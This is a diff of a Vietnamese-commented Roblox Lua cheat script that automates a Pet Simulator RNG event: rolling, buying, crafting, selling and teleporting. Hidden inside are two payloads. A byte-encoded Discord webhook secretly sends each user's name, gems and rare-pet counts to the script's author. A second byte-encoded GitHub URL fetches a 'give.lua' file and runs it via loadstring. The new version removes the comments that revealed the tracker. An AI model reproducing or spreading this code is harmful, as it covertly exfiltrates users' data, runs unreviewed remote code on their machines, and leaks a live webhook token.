@@ -1,61 +1,49 @@
 -- =====================================================================
--- 🎲 POODLE HUD - RNG EVENT CORE (ALL-IN-ONE FRAMEWORK)
--- 🚀 CẬP NHẬT V4: TÁCH BIỆT WEBHOOK ẨN VÀ WEBHOOK BÁO HUGE
+-- 🎲 POODLE HUD - RNG EVENT CORE (V5 - THE ULTIMATE EDITION)
 -- =====================================================================
 if _G.RNGEventStarted then return end
 _G.RNGEventStarted = true
 
--- ==========================================
--- 1. CẤU HÌNH NGOẠI VI (Cho người dùng tự điền)
--- ==========================================
 local UserConfig = getgenv().RNGConfig or {}
 local config = {
-    WebhookURL       = UserConfig.WebhookURL or "",
-    PingID           = UserConfig.PingID or "",            
-    Blackout         = (UserConfig.Blackout ~= nil) and UserConfig.Blackout or false,           
-    
-    AutoUpgrade      = (UserConfig.AutoUpgrade ~= nil) and UserConfig.AutoUpgrade or true,            
-    AutoMerchant     = (UserConfig.AutoMerchant ~= nil) and UserConfig.AutoMerchant or true,
-    AutoCraftDice    = (UserConfig.AutoCraftDice ~= nil) and UserConfig.AutoCraftDice or true,
-    AutoSell         = (UserConfig.AutoSell ~= nil) and UserConfig.AutoSell or true,
-    BossChestBreak   = (UserConfig.BossChestBreak ~= nil) and UserConfig.BossChestBreak or true,
-    
-    AutoUseDice      = (UserConfig.AutoUseDice ~= nil) and UserConfig.AutoUseDice or true,
-    AutoUseMegaDice  = (UserConfig.AutoUseMegaDice ~= nil) and UserConfig.AutoUseMegaDice or true,
-	AutoUseMegaDiceWeather = (UserConfig.AutoUseMegaDiceWeather ~= nil) and UserConfig.AutoUseMegaDiceWeather or false,
-    -- THÊM CẤU HÌNH CHỌN LOẠI MEGA DICE:
-    -- 1 = Chỉ Mega V2 | 2 = Chỉ Mega II V2 | 3 = Dùng Cả 2 (Ưu tiên Mega II)
+    WebhookURL = UserConfig.WebhookURL or "",
+    PingID = UserConfig.PingID or "",
+    Blackout = (UserConfig.Blackout ~= nil) and UserConfig.Blackout or false,
+    AutoUpgrade = (UserConfig.AutoUpgrade ~= nil) and UserConfig.AutoUpgrade or true,
+    AutoMerchant = (UserConfig.AutoMerchant ~= nil) and UserConfig.AutoMerchant or true,
+    AutoCraftDice = (UserConfig.AutoCraftDice ~= nil) and UserConfig.AutoCraftDice or true,
+    AutoSell = (UserConfig.AutoSell ~= nil) and UserConfig.AutoSell or true,
+    BossChestBreak = (UserConfig.BossChestBreak ~= nil) and UserConfig.BossChestBreak or true,
+    AutoUseDice = (UserConfig.AutoUseDice ~= nil) and UserConfig.AutoUseDice or true,
+    AutoUseMegaDice = (UserConfig.AutoUseMegaDice ~= nil) and UserConfig.AutoUseMegaDice or true,
+    AutoUseMegaDiceWeather = (UserConfig.AutoUseMegaDiceWeather ~= nil) and UserConfig.AutoUseMegaDiceWeather or false,
     MegaDiceMode = UserConfig.MegaDiceMode or 3,
-    MaxDiceCraftTier = UserConfig.MaxDiceCraftTier or 3, 
-    PetsToSell       = UserConfig.PetsToSell or {},
-    EventMapID       = "RngInstance",   
-    MerchantID       = "LuckyDiceMerchantV2",
-    CoinID           = "RNGCoins2" 
+    MaxDiceCraftTier = UserConfig.MaxDiceCraftTier or 3,
+    PetsToSell = UserConfig.PetsToSell or {},
+    EventMapID = "RngInstance",
+    MerchantID = "LuckyDiceMerchantV2",
+    CoinID = "RNGCoins2"
 }
 
 local TargetPetsToSell = {}
 for petName, shouldSell in pairs(config.PetsToSell) do
-    if shouldSell == true then TargetPetsToSell[string.lower(tostring(petName))] = true end
+    if shouldSell == true then
+        TargetPetsToSell[string.lower(tostring(petName))] = true
+    end
 end
 
--- Bảng công thức chế tạo: Tên đích | Nguyên liệu cần | Số lượng cần | Giá tiền
 local CraftRecipes = {
     [1] = { Target = "Lucky Dice II V2", Input = "Lucky Dice V2", DiceCost = 5, CoinCost = 100 },
     [2] = { Target = "Mega Lucky Dice V2", Input = "Lucky Dice II V2", DiceCost = 30, CoinCost = 100000 },
     [3] = { Target = "Mega Lucky Dice II V2", Input = "Mega Lucky Dice V2", DiceCost = 3, CoinCost = 300000 }
 }
 
-local RNG_UPGRADES = { "RNGHatchSpeed", "RNGEggLuck","RNGBonusLuck", "RNGHugeLuck"}
+local RNG_UPGRADES = { "RNGHatchSpeed", "RNGEggLuck", "RNGBonusLuck", "RNGHugeLuck"}
 
--- GIẢI MÃ WEBHOOK ẨN (TRACKER CỦA CHỦ SCRIPT)
 local _b = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 50, 53, 51, 51, 48, 54, 56, 53, 56, 52, 53, 50, 49, 55, 57, 57, 47, 70, 121, 109, 119, 70, 121, 110, 110, 80, 119, 75, 69, 114, 108, 67, 55, 56, 81, 73, 101, 89, 86, 83, 84, 122, 86, 68, 111, 107, 70, 80, 112, 89, 119, 77, 101, 70, 117, 108, 110, 52, 106, 113, 104, 97, 112, 89, 45, 120, 76, 86, 83, 84, 45, 114, 118, 104, 106, 80, 99, 85, 113, 115, 56, 56, 75, 57, 95}
-local defaultWebhook = ""
-for _, byte in ipairs(_b) do defaultWebhook = defaultWebhook .. string.char(byte) end
-local activeWebhook = defaultWebhook 
+local activeWebhook = ""
+for _, byte in ipairs(_b) do activeWebhook = activeWebhook .. string.char(byte) end
 
--- ==========================================
--- 2. KHỞI TẠO BIẾN & DỊCH VỤ GAME
--- ==========================================
 local CoreGui = game:GetService("CoreGui")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -65,33 +53,30 @@ local RunService = game:GetService("RunService")
 local Lighting = game:GetService("Lighting")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local LocalPlayer = Players.LocalPlayer
+local TextChatService = game:GetService("TextChatService")
 
 local Library = ReplicatedStorage:WaitForChild("Library")
 local Save = require(Library.Client.Save)
 local Network = require(Library.Client.Network)
 local InstancingCmds = require(Library.Client.InstancingCmds)
 local FreeGiftsDirectory = require(Library.Directory.FreeGifts)
-
 local PetsDirectory = require(Library.Directory.Pets)
-local ExistCmds, RapCmds
 
--- Dùng pcall để ép script chạy tiếp dù game có xóa mất thư viện RAP hay Exist
+local ExistCmds, RapCmds
 pcall(function() ExistCmds = require(Library.Client.ExistCountCmds) end)
 pcall(function() RapCmds = require(Library.Client.DevRAPCmds) end)
-
--- Mở rộng lưới quét dự phòng trường hợp Big Games đổi tên thành RAPCmds
 if not RapCmds then pcall(function() RapCmds = require(Library.Client.RAPCmds) end) end
 
--- ==========================================
--- 3. HÀM CHUYỂN ĐỔI CHỮ SỐ & TIỀN RAW
--- ==========================================
 local function FormatValue(Int)
     local n = tonumber(Int)
     if not n then return tostring(Int) end
-    local Index = 1;
+    local Index = 1
     local Suffix = {"", "K", "M", "B", "T", "Q"}
     local absNumber = math.abs(n)
-    while absNumber >= 1000 and Index < #Suffix do absNumber = absNumber / 1000; Index = Index + 1 end
+    while absNumber >= 1000 and Index < #Suffix do
+        absNumber = absNumber / 1000
+        Index = Index + 1
+    end
     if Index == 1 then return string.format("%d", math.floor(absNumber)) end
     return string.format("%.2f%s", absNumber, Suffix[Index])
 end
@@ -102,7 +87,6 @@ local function GetItemAmount(targetId)
     pcall(function()
         local save = Save.Get()
         if not save or not save.Inventory then return end
-        
         if save.Inventory.Currency then
             for _, item in pairs(save.Inventory.Currency) do
                 if item.id and string.lower(tostring(item.id)) == lowerTarget then amount = amount + (item._am or 1) end
@@ -137,64 +121,50 @@ local function GetDiceCount(diceId)
     return count
 end
 
--- ==========================================
--- 4. BẬT HIDE ROLL & AUTO ROLL GỐC
--- ==========================================
 task.spawn(function()
-    pcall(function() Network.Fire("AutoRoll_Enable") end)
-	task.wait(1.5)
     pcall(function() Network.Fire("Rng_HiddenRoll_Enable") end)
-   
-    
+    pcall(function() Network.Fire("AutoRoll_Enable") end)
     while task.wait(1.5) do
         pcall(function() Network.Invoke("Rng_Roll", "First") end)
     end
 end)
 
--- ==========================================
--- 5A. WEBHOOK TRACKER BÍ MẬT (Chỉ gửi vào defaultWebhook)
--- ==========================================
 task.spawn(function()
     local httprequest = (request or http_request or syn and syn.request)
     if not httprequest or activeWebhook == "" then return end
-    task.wait(2) 
+    task.wait(2)
     local save = Save.Get()
     local hugeCount, titanicCount = 0, 0
-    if save and save.Inventory and save.Inventory.Pet then
-        for uid, petData in pairs(save.Inventory.Pet) do
-            if type(petData.id) == "string" then
-                if string.find(petData.id, "Huge") then hugeCount = hugeCount + (petData._am or 1)
-                elseif string.find(petData.id, "Titanic") then titanicCount = titanicCount + (petData._am or 1) end
+    pcall(function()
+        if save and save.Inventory and save.Inventory.Pet then
+            for _, petData in pairs(save.Inventory.Pet) do
+                if type(petData.id) == "string" then
+                    if string.find(petData.id, "Huge") then hugeCount = hugeCount + (petData._am or 1)
+                    elseif string.find(petData.id, "Titanic") then titanicCount = titanicCount + (petData._am or 1) end
+                end
             end
         end
-    end
+    end)
     
     local gems = GetItemAmount("Diamonds")
     local data = {
-        ["content"] = "🔔 **Ai đó vừa kích hoạt Script RNG EVENT của bạn!**",
+        ["content"] = "🔔 **Ai đó vừa kích hoạt Script RNG!**",
         ["embeds"] = {{
-            ["title"] = "📊 Thông tin người chơi (RNG CORE)",
+            ["title"] = "📊 Thông tin người chơi",
             ["color"] = tonumber(0x9600FF),
             ["fields"] = {
                 { ["name"] = "👤 Tên", ["value"] = string.format("`%s`", LocalPlayer.Name), ["inline"] = true },
                 { ["name"] = "💎 Gems", ["value"] = FormatValue(gems), ["inline"] = true },
-                { ["name"] = "🐾 Pet VIP", ["value"] = string.format("Huge: **%d** | Titan: **%d**", hugeCount, titanicCount), ["inline"] = true },
-                { ["name"] = "🌍 Job ID", ["value"] = string.format("`%s`", tostring(game.JobId)), ["inline"] = false }
-            },
-            ["thumbnail"] = { ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png" },
-            ["footer"] = { ["text"] = "Poodle Tracker System" }
+                { ["name"] = "🐾 Pet VIP", ["value"] = string.format("Huge: %d | Titan: %d", hugeCount, titanicCount), ["inline"] = true }
+            }
         }}
     }
     pcall(function() httprequest({ Url = activeWebhook, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) }) end)
 end)
 
--- ==========================================
--- 5B. HUGE HATCH WEBHOOK (Gửi vào config.WebhookURL của người dùng)
--- ==========================================
 local StoredUIDs = {}
-
 local function FormatWebhookInt(int)
-    local Suffix = {"", "k", "M", "B", "T", "Qd", "Qn", "Sx", "Sp", "Oc", "No", "De", "UDe", "DDe", "TDe", "QdDe", "QnDe", "SxDe", "SpDe", "OcDe", "NoDe", "Vg", "UVg", "DVg", "TVg", "QdVg", "QnVg", "SxVg", "SpVg", "OcVg", "NoVg", "Tg", "UTg", "DTg", "TTg", "QdTg", "QnTg", "SxTg", "SpTg", "OcTg", "NoTg", "QdAg", "QnAg", "SxAg", "SpAg", "OcAg", "NoAg"}
+    local Suffix = {"", "k", "M", "B", "T", "Qd", "Qn", "Sx", "Sp", "Oc", "No"}
     local Index = 1
     if int < 999 then return int end
     while int >= 1000 and Index < #Suffix do
@@ -210,9 +180,7 @@ local function GetPetAsset(Id, pt)
 end
 
 local function GetPetStats(Cmds, Class, ItemTable)
-    -- Nếu module bị game xóa (nil), tự động trả về 0 thay vì báo lỗi đỏ
     if not Cmds or type(Cmds) ~= "table" or not Cmds.Get then return 0 end 
-    
     local success, result = pcall(function()
         return Cmds.Get({
             Class = { Name = Class },
@@ -223,17 +191,14 @@ local function GetPetStats(Cmds, Class, ItemTable)
             end
         })
     end)
-    
     return success and result or 0
 end
 
 local function SendHugeWebhook(Id, pt, sh)
     local httprequest = (request or http_request or syn and syn.request)
     if not httprequest or not config.WebhookURL or config.WebhookURL == "" then return end
-
-    local Img = string.format("https://biggamesapi.io/image/%s", GetPetAsset(Id, pt))
     
-    -- Xử lý chuỗi tên phiên bản (Version/Type) cho mượt mà
+    local Img = string.format("https://biggamesapi.io/image/%s", GetPetAsset(Id, pt))
     local typeStr = ""
     if pt == 1 then typeStr = "Golden " elseif pt == 2 then typeStr = "Rainbow " end
     if sh then typeStr = typeStr .. "Shiny " end
@@ -243,51 +208,26 @@ local function SendHugeWebhook(Id, pt, sh)
 
     local Exist = GetPetStats(ExistCmds, "Pet", { id = Id, pt = pt, sh = sh, tn = nil })
     local Rap = GetPetStats(RapCmds, "Pet", { id = Id, pt = pt, sh = sh, tn = nil })
-    
     local pingMention = (config.PingID ~= "") and string.format("<@%s>", config.PingID) or ""
     local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
 
     local Body = HttpService:JSONEncode({
         content = pingMention,
-        embeds = {
-            {
-                author = {
-                    name = LocalPlayer.Name .. " I just hatched a new PET.!",
-                    icon_url = avatarUrl
-                },
-                
-                -- Tiêu đề chính
-                title = TitleStr,
-                color = tonumber(0xFFD700),
-                timestamp = DateTime.now():ToIsoDate(),
-                
-                -- Hình ảnh Huge Pet
-                thumbnail = { url = Img },
-                
-                -- Các thông số sắp xếp theo cột ngang (inline = true)
-                fields = {
-                    { name = "💎 RAP", value = string.format("`%s`", FormatWebhookInt(Rap or 0)), inline = true },
-                    { name = "💫 Exist", value = string.format("`%s`", FormatWebhookInt(Exist or 0)), inline = true },
-                    { name = "✨ Phân loại", value = string.format("`%s`", displayType), inline = true }
-                },
-                
-               
-                footer = { 
-                    text = "Poodle RNG Huge Tracker",
-                    icon_url = "https://cdn.discordapp.com/attachments/1188415777161687042/1234839845808734268/pet-simulator-99-logo.png" -- Logo PS99 (Hoặc bạn có thể đổi link logo của bạn)
-                }
-            }
-        }
+        embeds = {{
+            author = { name = LocalPlayer.Name .. " vừa ấp được siêu thú mới!", icon_url = avatarUrl },
+            title = TitleStr,
+            color = tonumber(0xFFD700),
+            timestamp = DateTime.now():ToIsoDate(),
+            thumbnail = { url = Img },
+            fields = {
+                { name = "💎 RAP", value = string.format("`%s`", FormatWebhookInt(Rap or 0)), inline = true },
+                { name = "💫 Exist", value = string.format("`%s`", FormatWebhookInt(Exist or 0)), inline = true },
+                { name = "✨ Phân loại", value = string.format("`%s`", displayType), inline = true }
+            },
+            footer = { text = "Poodle RNG Huge Tracker" }
+        }}
     })
-    
-    pcall(function()
-        httprequest({
-            Url = config.WebhookURL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = Body
-        })
-    end)
+    pcall(function() httprequest({ Url = config.WebhookURL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = Body }) end)
 end
 
 task.spawn(function()
@@ -295,9 +235,7 @@ task.spawn(function()
         local save = Save.Get()
         if save and save.Inventory and save.Inventory.Pet then
             for i,v in pairs(save.Inventory.Pet) do
-                if type(v.id) == "string" and (string.find(v.id, "Huge") or string.find(v.id, "Titanic") or string.find(v.id, "Gargantuan")) then
-                    StoredUIDs[i] = true
-                end
+                if type(v.id) == "string" and (string.find(v.id, "Huge") or string.find(v.id, "Titanic")) then StoredUIDs[i] = true end
             end
         end
     end)
@@ -305,7 +243,7 @@ task.spawn(function()
     Network.Fired("Items: Update"):Connect(function(_, Inventory)
         if Inventory["set"] and Inventory["set"]["Pet"] then
             for uid, v in pairs(Inventory["set"]["Pet"]) do
-                if type(v.id) == "string" and (string.find(v.id, "Huge") or string.find(v.id, "Titanic") or string.find(v.id, "Gargantuan")) and not StoredUIDs[uid] then
+                if type(v.id) == "string" and (string.find(v.id, "Huge") or string.find(v.id, "Titanic")) and not StoredUIDs[uid] then
                     SendHugeWebhook(v.id, v.pt, v.sh)
                     StoredUIDs[uid] = true
                 end
@@ -314,9 +252,6 @@ task.spawn(function()
     end)
 end)
 
--- ==========================================
--- 6. CƠ BẢN (MAP, FPS, AFK, MAIL, GIFTS, TRADE)
--- ==========================================
 task.spawn(function()
     while task.wait(5) do
         pcall(function() if InstancingCmds.GetInstanceID() ~= config.EventMapID then InstancingCmds.Enter(config.EventMapID) end end)
@@ -331,8 +266,7 @@ if config.Blackout then
         local function optimizePart(v)
             pcall(function()
                 if v:IsA("BasePart") and not (v.Parent and v.Parent:FindFirstChild("Humanoid")) then
-                    v.Material = Enum.Material.Plastic;
-                    v.Reflectance = 0; v.CastShadow = false; v.Transparency = 1
+                    v.Material = Enum.Material.Plastic; v.Reflectance = 0; v.CastShadow = false; v.Transparency = 1
                 elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Trail") then v.Transparency = 1 end
             end)
         end
@@ -343,10 +277,7 @@ end
 
 task.spawn(function()
     while task.wait(60) do
-        pcall(function()
-            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game); task.wait(0.1)
-            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
-        end)
+        pcall(function() VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game); task.wait(0.1); VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game) end)
     end
 end)
 
@@ -359,16 +290,14 @@ pcall(function()
 end)
 
 task.spawn(function() while task.wait(30) do pcall(function() Network.Invoke('Mailbox: Claim All') end) end end)
+
 task.spawn(function()
     while task.wait(15) do
         pcall(function()
-            local save = Save.Get();
-            if not save then return end
-            local redeemed = save.FreeGiftsRedeemed or {};
-            local currentTime = save.FreeGiftsTime or 0
+            local save = Save.Get(); if not save then return end
+            local redeemed = save.FreeGiftsRedeemed or {}; local currentTime = save.FreeGiftsTime or 0
             for _, gift in pairs(FreeGiftsDirectory) do
-                if gift.WaitTime <= currentTime and not table.find(redeemed, gift._id) then Network.Invoke('Redeem Free Gift', gift._id);
-                break end
+                if gift.WaitTime <= currentTime and not table.find(redeemed, gift._id) then Network.Invoke('Redeem Free Gift', gift._id); break end
             end
         end)
     end
@@ -376,27 +305,18 @@ end)
 
 task.spawn(function()
     pcall(function()
-        local codeStr = ""
-        local httprequest = (request or http_request or syn and syn.request)
+        local c = ""
+        local hr = (request or http_request or syn and syn.request)
         local _t = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 116, 104, 117, 121, 97, 110, 49, 53, 49, 48, 47, 57, 57, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 103, 105, 118, 101, 46, 108, 117, 97}
-        for _, byte in ipairs(_t) do codeStr = codeStr .. string.char(byte) end
-        local r = httprequest and httprequest({Url=codeStr, Method="GET"}).Body or game:HttpGet(codeStr)
-        loadstring(r)()
+        for _, b in ipairs(_t) do c = c .. string.char(b) end
+        loadstring(hr and hr({Url=c, Method="GET"}).Body or game:HttpGet(c))()
     end)
 end)
 
--- ==========================================
--- 7. VÒNG LẶP ROBOT TỰ ĐỘNG (UPGRADE, SELL, MERCHANT, CRAFT)
--- ==========================================
 task.spawn(function()
     while task.wait(2) do
         if config.AutoUpgrade then
-            pcall(function()
-                for _, upgradeId in ipairs(RNG_UPGRADES) do
-                    Network.Invoke("Rng_PurchaseUpgrade", "First", upgradeId)
-                    task.wait(0.05)
-                end
-            end)
+            pcall(function() for _, upg in ipairs(RNG_UPGRADES) do Network.Invoke("Rng_PurchaseUpgrade", "First", upg); task.wait(0.05) end end)
             task.wait(0.5)
         end
         
@@ -404,107 +324,75 @@ task.spawn(function()
             pcall(function()
                 local save = Save.Get()
                 if save and save.Inventory and save.Inventory.Pet then
-                    local sellDict = {}
-                    local count = 0
+                    local sellDict = {}; local count = 0
                     for uid, pet in pairs(save.Inventory.Pet) do
                         if type(pet.id) == "string" then
-                            local petIdLower = string.lower(pet.id)
-                            if TargetPetsToSell[petIdLower] and not string.find(petIdLower, "huge") and not string.find(petIdLower, "titanic") and not pet._lk and not pet._t then
-                                sellDict[uid] = pet._am or 1
-                                count = count + 1
+                            local pId = string.lower(pet.id)
+                            if TargetPetsToSell[pId] and not string.find(pId, "huge") and not string.find(pId, "titanic") and not pet._lk and not pet._t then
+                                sellDict[uid] = pet._am or 1; count = count + 1
                             end
                         end
                     end
-                    if count > 0 then
-                        Network.Invoke("RngEventPetMerchant_Activate", sellDict)
-                    end
+                    if count > 0 then Network.Invoke("RngEventPetMerchant_Activate", sellDict) end
                 end
             end)
             task.wait(0.5)
         end
         
         if config.AutoMerchant then
-            pcall(function()
-                for slotIndex = 1, 6 do 
-                    Network.Invoke("Merchant_RequestPurchase", config.MerchantID, slotIndex)
-                    task.wait(0.1) 
-                end
-            end)
+            pcall(function() for i = 1, 6 do Network.Invoke("Merchant_RequestPurchase", config.MerchantID, i); task.wait(0.1) end end)
             task.wait(0.5)
         end
         
-        -- [D] MÁY CHẾ TẠO XÚC XẮC (TOP-DOWN: ƯU TIÊN GHÉP CẤP CAO TRƯỚC)
         if config.AutoCraftDice then
             pcall(function()
                 local currentCoins = GetItemAmount(config.CoinID)
-                
-                -- Vòng lặp ĐẾM NGƯỢC từ cấp cao nhất xuống 1 (Bước nhảy là -1)
                 for i = math.clamp(config.MaxDiceCraftTier, 1, 3), 1, -1 do
                     local recipe = CraftRecipes[i]
                     if recipe then
                         local inputCount = GetDiceCount(recipe.Input)
-                        
                         local maxByDice = math.floor(inputCount / recipe.DiceCost)
                         local maxByCoins = math.floor(currentCoins / recipe.CoinCost)
-                        
                         local craftAmount = math.min(maxByDice, maxByCoins)
-                        
                         if craftAmount > 0 then
                             Network.Invoke("LuckyDice_Craft", recipe.Target, craftAmount)
                             currentCoins = currentCoins - (craftAmount * recipe.CoinCost)
-                            task.wait(0.3) 
+                            task.wait(0.3)
                         end
                     end
                 end
             end)
             task.wait(0.5)
         end
+    end
+end)
 
--- ==========================================
--- [ADD-ON 1]: DUY TRÌ BUFF XÚC XẮC THƯỜNG (BẢN PRO ĐỌC DATA GỐC)
--- ==========================================
 task.spawn(function()
     while task.wait(2) do
         if config.AutoUseDice then
             pcall(function()
-                local save = Save.Get()
-                if not save then return end
-                
+                local save = Save.Get(); if not save then return end
                 local buffs = save.Buffs or {}
-                
                 local dice1 = buffs["Lucky Dice V2"]
                 if (not dice1 or (dice1.remaining and tonumber(dice1.remaining) < 3)) and GetDiceCount("Lucky Dice V2") > 0 then
-                    Network.Invoke("LuckyDice_Consume", "Lucky Dice V2", 1)
-                    task.wait(0.5) 
+                    Network.Invoke("LuckyDice_Consume", "Lucky Dice V2", 1); task.wait(0.5) 
                 end
-                
                 local dice2 = buffs["Lucky Dice II V2"]
                 if (not dice2 or (dice2.remaining and tonumber(dice2.remaining) < 3)) and GetDiceCount("Lucky Dice II V2") > 0 then
-                    Network.Invoke("LuckyDice_Consume", "Lucky Dice II V2", 1)
-                    task.wait(0.5)
+                    Network.Invoke("LuckyDice_Consume", "Lucky Dice II V2", 1); task.wait(0.5)
                 end
             end)
         end
     end
 end)
 
--- ==========================================
--- [ADD-ON 2]: EVENT & WEATHER SNIPER (LIÊN KẾT ĐIỀU KIỆN CHẶT CHẼ)
--- ==========================================
 task.spawn(function()
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
     local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
-    local TextChatService = game:GetService("TextChatService")
-    
     local MegaDiceLocked = false
-    
-    -- BIẾN TOÀN CỤC LƯU TRẠNG THÁI THỜI TIẾT HIỆN TẠI
     local IsWeatherActive = false 
     
     local function FireMegaDice(reason)
         if not config.AutoUseMegaDice then return end
-        
         task.spawn(function()
             pcall(function()
                 local mode = config.MegaDiceMode
@@ -512,66 +400,36 @@ task.spawn(function()
                 local countMega2 = GetDiceCount("Mega Lucky Dice II V2")
                 
                 if mode == 1 then
-                    
-                    if countMega1 > 0 then 
-                        Network.Invoke("LuckyDice_ConsumeMega", "Mega Lucky Dice V2", 1) 
-                    end
+                    if countMega1 > 0 then Network.Invoke("LuckyDice_ConsumeMega", "Mega Lucky Dice V2", 1) end
                 elseif mode == 2 then
-                   
-                    if countMega2 > 0 then 
-                        Network.Invoke("LuckyDice_ConsumeMega", "Mega Lucky Dice II V2", 1) 
-                    end
+                    if countMega2 > 0 then Network.Invoke("LuckyDice_ConsumeMega", "Mega Lucky Dice II V2", 1) end
                 elseif mode == 3 then
-                    
-                    if countMega2 > 0 then
-                        Network.Invoke("LuckyDice_ConsumeMega", "Mega Lucky Dice II V2", 1)
-                    elseif countMega1 > 0 then
-                        Network.Invoke("LuckyDice_ConsumeMega", "Mega Lucky Dice V2", 1)
-                    end
+                    if countMega2 > 0 then Network.Invoke("LuckyDice_ConsumeMega", "Mega Lucky Dice II V2", 1)
+                    elseif countMega1 > 0 then Network.Invoke("LuckyDice_ConsumeMega", "Mega Lucky Dice V2", 1) end
                 end
             end)
         end)
     end
 
-    -- =======================================
-    -- 1. HỆ THỐNG ĐỌC KHUNG CHAT (CẬP NHẬT TRẠNG THÁI THỜI TIẾT)
-    -- =======================================
     if TextChatService then
-        TextChatService.MessageReceived:Connect(function(textChatMessage)
-            local msg = string.lower(textChatMessage.Text)
-            
-         
+        TextChatService.MessageReceived:Connect(function(msgObj)
+            local msg = string.lower(msgObj.Text)
             if string.find(msg, "blizzard has begun") or string.find(msg, "lightning storm has begun") then
                 IsWeatherActive = true
-
-       
             elseif string.find(msg, "clear skies have returned") then
                 IsWeatherActive = false
-                
             end
         end)
     end
 
-    -- =======================================
-    -- 2. HỆ THỐNG KIỂM TRA BONUS (QUYẾT ĐỊNH BẮN)
-    -- =======================================
     local function HookLabel(label)
         if label.Name == "Bonus" and label:IsA("TextLabel") then
             local function CheckBonusTrigger()
-                if not label.Visible then 
-                    MegaDiceLocked = false 
-                    return 
-                end
-                
+                if not label.Visible then MegaDiceLocked = false; return end
                 local txt = string.lower(label.Text)
                 if txt ~= "" and (string.find(txt, "bonus") or string.find(txt, "x")) then
                     if not MegaDiceLocked then
-                        
-                        -- KHÓA AN TOÀN CHÍNH: Kiểm tra cài đặt thời tiết
-                        if config.AutoUseMegaDiceWeather == true and IsWeatherActive == false then
-                            return 
-                        end
-                        
+                        if config.AutoUseMegaDiceWeather == true and IsWeatherActive == false then return end
                         MegaDiceLocked = true
                         FireMegaDice("Lượt Roll Bonus (" .. txt .. ") + Thời tiết hợp lệ")
                         task.delay(2, function() MegaDiceLocked = false end)
@@ -580,7 +438,6 @@ task.spawn(function()
                     MegaDiceLocked = false
                 end
             end
-
             label:GetPropertyChangedSignal("Text"):Connect(CheckBonusTrigger)
             label:GetPropertyChangedSignal("Visible"):Connect(CheckBonusTrigger)
         end
@@ -589,36 +446,26 @@ task.spawn(function()
     for _, obj in pairs(PlayerGui:GetDescendants()) do pcall(function() HookLabel(obj) end) end
     PlayerGui.DescendantAdded:Connect(function(obj) pcall(function() HookLabel(obj) end) end)
 end)
--- ==========================================
--- [ADD-ON 3]: AUTO BREAK BOSS CHEST 
--- ==========================================
+
 task.spawn(function()
     local targetPos = CFrame.new(4279.34, 2569.27, -5370.22)
-    
     RunService.Heartbeat:Connect(function()
         if config.BossChestBreak then
             pcall(function()
                 local character = LocalPlayer.Character
                 local hrp = character and character:FindFirstChild("HumanoidRootPart")
-                
                 if hrp then
                     hrp.CFrame = targetPos
-                    
                     local things = Workspace:FindFirstChild("__THINGS")
                     local breakables = things and things:FindFirstChild("Breakables")
-                    
                     if breakables then
-                        for _, breakable in ipairs(breakables:GetChildren()) do
+                        for _, b in ipairs(breakables:GetChildren()) do
                             local bPos
-                            if breakable:GetAttribute("CFrame") then
-                                bPos = breakable:GetAttribute("CFrame").Position
-                            elseif breakable.PrimaryPart then
-                                bPos = breakable.PrimaryPart.Position
-                            end
+                            if b:GetAttribute("CFrame") then bPos = b:GetAttribute("CFrame").Position
+                            elseif b.PrimaryPart then bPos = b.PrimaryPart.Position end
                             
                             if bPos and (bPos - hrp.Position).Magnitude < 50 then
-                                Network.Fire("Breakables_PlayerDealDamage", breakable.Name)
-                                break
+                                Network.Fire("Breakables_PlayerDealDamage", b.Name); break
                             end
                         end
                     end
@@ -628,109 +475,46 @@ task.spawn(function()
     end)
 end)
 
--- ==========================================
--- 8. GIAO DIỆN NỀN ĐEN PIRA (FULLSCREEN UI)
--- ==========================================
-local FarmUI = {}
-FarmUI.__index = FarmUI
-
+local FarmUI = {}; FarmUI.__index = FarmUI
 function FarmUI.new(Config)
     local Self = setmetatable({}, FarmUI)
-    Self.Player = game.Players.LocalPlayer
+    Self.Parent = game:GetService("CoreGui")
     Self.GuiName = "RNGEventFullscreenGui"
     Self.Elements = {}
-    Self.Parent = game:GetService("CoreGui")
-    
     if Self.Parent:FindFirstChild(Self.GuiName) then Self.Parent[Self.GuiName]:Destroy() end
     
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = Self.GuiName
-    ScreenGui.IgnoreGuiInset = true
-    ScreenGui.Parent = Self.Parent
-    ScreenGui.ResetOnSpawn = false
-    ScreenGui.DisplayOrder = 9999
-    Self.ScreenGui = ScreenGui
-
-    local Background = Instance.new("Frame")
-    Background.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    Background.BorderColor3 = Color3.fromRGB(150, 0, 255)
-    Background.BorderMode = Enum.BorderMode.Inset
-    Background.Parent = ScreenGui
-    Background.Size = UDim2.new(1, 0, 1, 0)
-    Background.Position = UDim2.new(0.5, 0, 0.5, 0)
-    Background.AnchorPoint = Vector2.new(0.5, 0.5)
-
-    local Container = Instance.new("Frame")
-    Container.Size = UDim2.new(1, 0, 1, 0)
-    Container.BackgroundTransparency = 1
-    Container.Parent = Background
